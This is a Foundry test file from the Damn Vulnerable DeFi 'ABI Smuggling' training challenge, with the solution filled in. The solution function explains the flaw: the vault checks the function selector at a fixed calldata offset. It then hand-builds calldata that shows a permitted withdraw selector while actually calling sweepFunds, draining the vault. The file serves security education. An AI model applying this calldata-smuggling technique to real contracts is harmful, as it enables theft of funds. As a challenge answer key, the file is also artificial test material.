// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        /**
         * VULNERABILITY EXPLANATION:
         * The execute() function reads the selector from a FIXED position in calldata:
         *   uint256 calldataOffset = 4 + 32 * 3 = 100 bytes
         * 
         * But the actual actionData location is determined by the ABI-encoded offset!
         * We can craft calldata where:
         * - At byte 100: the ALLOWED selector (withdraw = 0xd9caed12)
         * - At the actual data location: the FORBIDDEN call (sweepFunds)
         *
         * Standard ABI encoding for execute(address, bytes):
         *   0x00-0x03: execute selector
         *   0x04-0x23: target address
         *   0x24-0x43: offset to bytes data (normally 0x40)
         *   0x44-0x63: length of bytes
         *   0x64+: actual bytes data <- selector read from here (byte 100)
         *
         * Our malicious encoding:
         *   0x00-0x03: execute selector (0x1cff79cd)
         *   0x04-0x23: target address (vault)
         *   0x24-0x43: offset = 0x80 (points to byte 132)
         *   0x44-0x63: padding (zeros)
         *   0x64-0x67: FAKE selector (withdraw 0xd9caed12) <- checked here!
         *   0x68-0x83: more padding
         *   0x84-0xA3: length of real data
         *   0xA4+: REAL actionData (sweepFunds call)
         */

        // Build the real sweepFunds calldata
        bytes memory sweepFundsCall = abi.encodeCall(
            SelfAuthorizedVault.sweepFunds,
            (recovery, IERC20(address(token)))
        );

        // Build the malicious calldata manually
        bytes memory maliciousCalldata = abi.encodePacked(
            // execute selector
            bytes4(0x1cff79cd),
            // target address (vault) - 32 bytes, left-padded
            bytes32(uint256(uint160(address(vault)))),
            // offset to actionData = 0x80 (128 bytes from params start)
            bytes32(uint256(0x80)),
            // padding (32 bytes)
            bytes32(0),
            // FAKE selector at position 100 (withdraw = 0xd9caed12)
            // Plus padding to complete 32 bytes
            bytes4(0xd9caed12), bytes28(0),
            // length of real actionData
            bytes32(uint256(sweepFundsCall.length)),
            // actual sweepFunds calldata
            sweepFundsCall
        );

        // Execute the malicious call
        (bool success,) = address(vault).call(maliciousCalldata);
        require(success, "attack failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
